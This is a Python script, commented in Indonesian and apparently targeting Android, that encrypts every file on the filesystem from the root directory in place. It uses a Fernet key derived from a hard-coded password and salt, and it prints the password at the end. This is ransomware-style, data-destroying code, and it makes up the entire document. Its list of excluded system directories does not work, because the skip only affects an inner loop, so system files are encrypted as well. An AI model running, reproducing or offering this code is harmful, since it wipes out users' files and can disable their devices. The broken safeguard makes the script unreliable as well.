import os
import sys
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend

PASSWORD = "12345" # Password default
SALT = "in1s4ltb4ikg1l4g3m4nt4ps4wd" # Salt default (jangan diubah sembarangan!)

# Daftar direktori yang dikecualikan (penting untuk sistem Android)
EXCLUDED_DIRECTORIES = [
    "/system",
    "/vendor",
    "/boot",
    "/recovery",
    "/cache",
    "/efs"
]

def generate_key(password, salt):
    password = password.encode()
    salt = salt.encode()
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=390000,
        backend=default_backend()
    )
    key = base64.urlsafe_b64encode(kdf.derive(password))
    return key

def encrypt_file(file_path, key):
    f = Fernet(key)
    try:
        with open(file_path, "rb") as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(file_path, "wb") as file:
            file.write(encrypted_data)
        return True
    except Exception as e:
        print(f"Error encrypting {file_path}: {e}")
        return False

def encrypt_directory(directory, password, salt):
    key = generate_key(password, salt)
    encrypted_count = 0
    for root, _, files in os.walk(directory):
        # Skip direktori yang dikecualikan
        for excluded_dir in EXCLUDED_DIRECTORIES:
            if root.startswith(excluded_dir):
                print(f"Skipping directory: {root}")
                continue
        for file in files:
            file_path = os.path.join(root, file)
            if encrypt_file(file_path, key):
                encrypted_count += 1
    return encrypted_count

if __name__ == "__main__":
    # Enkripsi semua direktori, mulai dari root
    encrypted_count = encrypt_directory("/", PASSWORD, SALT)

    print(f"Semua file telah terenkripsi. Password: {PASSWORD}")
